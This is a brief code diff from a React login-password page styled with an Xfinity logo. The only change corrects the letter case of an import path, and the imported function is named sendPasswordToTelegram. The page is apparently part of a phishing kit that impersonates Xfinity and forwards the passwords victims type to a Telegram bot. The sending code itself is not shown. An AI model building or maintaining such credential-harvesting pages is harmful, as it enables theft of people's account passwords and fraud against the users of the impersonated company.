@@ -3,7 +3,7 @@ import { Link, useLocation, useNavigate } from "react-router-dom";
 import { Eye, EyeOff, LoaderCircle } from "lucide-react";
 import Logo from "@/assets/xfinity-logo-grey.svg";
 import Footer from "@/components/Footer/Footer";
-import { sendPasswordToTelegram } from "@/bot/Telegrambot";
+import { sendPasswordToTelegram } from "@/bot/telegrambot";
 
 const LoginPassword = () => {
   const location = useLocation();
